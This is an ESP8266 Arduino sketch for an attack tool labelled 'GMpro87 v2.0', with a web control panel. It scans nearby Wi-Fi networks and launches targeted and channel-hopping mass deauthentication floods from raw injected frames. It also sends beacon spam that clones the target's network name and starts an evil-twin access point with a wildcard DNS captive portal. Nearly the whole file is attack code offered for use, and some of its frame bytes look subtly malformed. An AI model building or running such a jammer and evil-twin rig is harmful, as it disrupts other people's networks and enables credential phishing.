#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <LittleFS.h>

// --- Definisi Internal untuk Packet Injection ---
extern "C" {
  #include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8_t status);
  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
}

// --- Struktur Data & Variabel Global ---
struct Target {
  String ssid = "";
  uint8_t bssid[6];
  int ch = 1;
};

Target target;
ESP8266WebServer server(80);
DNSServer dnsServer;

String logs = "GMpro87 System Ready...";
bool attack_deauth = false;
bool attack_mass_deauth = false;
bool attack_spam = false;
bool attack_evil = false;

int beacon_count = 15;
int current_hop_channel = 1;
unsigned long last_attack_time = 0;
unsigned long last_hop_time = 0;

// --- Fungsi Log ---
void addLog(String msg) {
  logs = "[" + String(millis()/1000) + "s] " + msg + "\n" + logs;
  if(logs.length() > 3000) logs = logs.substring(0, 3000); 
}

// --- Fungsi Kirim Paket Deauth (Raw) ---
void sendDeauthPacket(uint8_t* bssid, uint8_t ch) {
  uint8_t deauthPkg[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
    0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&deauthPkg[10], bssid, 6);
  memcpy(&deauthPkg[16], bssid, 6);

  wifi_set_channel(ch);
  wifi_send_pkt_freedom(deauthPkg, 26, 0);
}

// --- Fungsi Beacon Spam ---
void sendBeaconSpam() {
  if (target.ssid == "") return;
  for (int i = 0; i < beacon_count; i++) {
    uint8_t mac[6];
    for (int j = 0; j < 6; j++) mac[j] = random(256);
    mac[5] = i;

    uint8_t packet[128];
    int len = 0;
    uint8_t header[] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    memcpy(packet, header, 10);
    memcpy(&packet[10], mac, 6); 
    memcpy(&packet[16], mac, 6);
    len += 22;
    packet[len++] = 0x00; packet[len++] = 0x00;
    uint8_t fixed[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04 };
    memcpy(&packet[len], fixed, 12);
    len += 12;
    packet[len++] = 0x00; 
    packet[len++] = target.ssid.length();
    for (int s = 0; s < target.ssid.length(); s++) packet[len++] = target.ssid[s];
    uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)target.ch };
    memcpy(&packet[len], rates, 13);
    len += 13;

    wifi_set_channel(target.ch);
    wifi_send_pkt_freedom(packet, len, 0);
    delay(1);
  }
}

// --- Dashboard UI ---
void handleRoot() {
  String s = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>";
  s += "body{background:#000;color:#0f0;font-family:monospace;padding:15px;margin:0;}";
  s += ".box{border:1px solid #0f0;padding:15px;border-radius:5px;box-shadow:0 0 10px #0f02;}";
  s += "h2{text-align:center;color:#fff;text-shadow:0 0 5px #0f0;margin-top:0;}";
  s += ".info{background:#111;padding:10px;border-left:3px solid #f00;margin-bottom:15px;font-size:12px;}";
  s += ".btn-group{display:grid;grid-template-columns:1fr 1fr;gap:10px;}";
  s += ".btn{background:#000;color:#0f0;border:1px solid #0f0;padding:12px;cursor:pointer;font-weight:bold;text-transform:uppercase;font-size:11px;}";
  s += ".btn:active{background:#0f0;color:#000;}";
  s += ".active{background:#f00 !important;color:#fff !important;border-color:#f00 !important;box-shadow:0 0 10px #f00;}";
  s += ".scan-btn{grid-column:span 2;background:#0f0;color:#000;margin-bottom:5px;}";
  s += "pre{background:#050505;padding:10px;height:220px;overflow:auto;border:1px inset #0f0;font-size:11px;margin-top:15px;white-space:pre-wrap;}";
  s += "a{color:#0f0;text-decoration:none;font-weight:bold;border:1px solid #0f0;padding:0 3px;margin-right:5px;}";
  s += "</style></head><body>";

  s += "<div class='box'>";
  s += "<h2>GMPRO87 v2.0</h2>";
  s += "<div class='info'>";
  s += "TARGET : " + (target.ssid == "" ? "--- NONE ---" : target.ssid) + "<br>";
  s += "CHANNEL: " + (target.ssid == "" ? "-" : String(target.ch)) + "<br>";
  s += "STATUS : " + String(attack_deauth || attack_mass_deauth || attack_spam || attack_evil ? "ATTACKING..." : "IDLE") + "</div>";

  s += "<div class='btn-group'>";
  s += "<button class='btn scan-btn' onclick=\"location.href='/scan'\">RE-SCAN NETWORKS</button>";
  s += "<button class='btn "+String(attack_deauth?"active":"")+"' onclick=\"fetch('/attack?type=deauth').then(()=>location.reload())\">DEAUTH TGT</button>";
  s += "<button class='btn "+String(attack_mass_deauth?"active":"")+"' onclick=\"fetch('/attack?type=mass').then(()=>location.reload())\">MASS DEAUTH</button>";
  s += "<button class='btn "+String(attack_spam?"active":"")+"' onclick=\"fetch('/attack?type=spam').then(()=>location.reload())\">BCN SPAM</button>";
  s += "<button class='btn "+String(attack_evil?"active":"")+"' onclick=\"fetch('/attack?type=evil').then(()=>location.reload())\">EVIL TWIN</button>";
  s += "</div>";

  s += "<pre>" + logs + "</pre>";
  s += "</div></body></html>";
  server.send(200, "text/html", s);
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();

  WiFi.softAP("GMpro87_Admin", "password123");
  addLog("AP Started: GMpro87_Admin");

  server.on("/", handleRoot);
  
  server.on("/scan", [](){
    addLog("Scanning...");
    int n = WiFi.scanNetworks();
    logs = ""; // Clear logs to show scan results
    for (int i=0; i<n; i++) {
      String s = WiFi.SSID(i);
      String b = WiFi.BSSIDstr(i);
      int c = WiFi.channel(i);
      addLog("<a href='/set?ssid="+s+"&ch="+String(c)+"&bssid="+b+"'>[SEL]</a> "+s+" (CH "+String(c)+")");
    }
    server.sendHeader("Location", "/");
    server.send(302, "text/plain", "OK");
  });

  server.on("/set", [](){
    target.ssid = server.arg("ssid");
    target.ch = server.arg("ch").toInt();
    String bssidStr = server.arg("bssid");
    int values[6];
    if (sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
      for (int i = 0; i < 6; ++i) target.bssid[i] = (uint8_t)values[i];
    }
    addLog("Target Set: " + target.ssid);
    server.sendHeader("Location", "/");
    server.send(302, "text/plain", "OK");
  });

  server.on("/attack", [](){
    String t = server.arg("type");
    if(t == "deauth") { attack_deauth = !attack_deauth; attack_mass_deauth = false; }
    if(t == "mass")   { attack_mass_deauth = !attack_mass_deauth; attack_deauth = false; }
    if(t == "spam")   { attack_spam = !attack_spam; }
    if(t == "evil") {
      attack_evil = !attack_evil;
      if(attack_evil && target.ssid != "") {
        WiFi.softAP(target.ssid.c_str());
        dnsServer.start(53, "*", WiFi.softAPIP());
      } else {
        WiFi.softAP("GMpro87_Admin", "password123");
        dnsServer.stop();
      }
    }
    server.send(200, "text/plain", "OK");
  });

  server.begin();
}

void loop() {
  server.handleClient();
  if(attack_evil) dnsServer.processNextRequest();

  unsigned long currentMillis = millis();

  if (attack_deauth && target.ssid != "") {
    if (currentMillis - last_attack_time > 100) {
      sendDeauthPacket(target.bssid, target.ch);
      last_attack_time = currentMillis;
    }
  }

  if (attack_mass_deauth) {
    if (currentMillis - last_hop_time > 150) {
      current_hop_channel++;
      if (current_hop_channel > 13) current_hop_channel = 1;
      wifi_set_channel(current_hop_channel);
      last_hop_time = currentMillis;
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauthPacket(broadcast, current_hop_channel);
    }
  }

  if (attack_spam && target.ssid != "") {
    static unsigned long lastS = 0;
    if (currentMillis - lastS > 200) {
      sendBeaconSpam();
      lastS = currentMillis;
    }
  }
  yield();
}
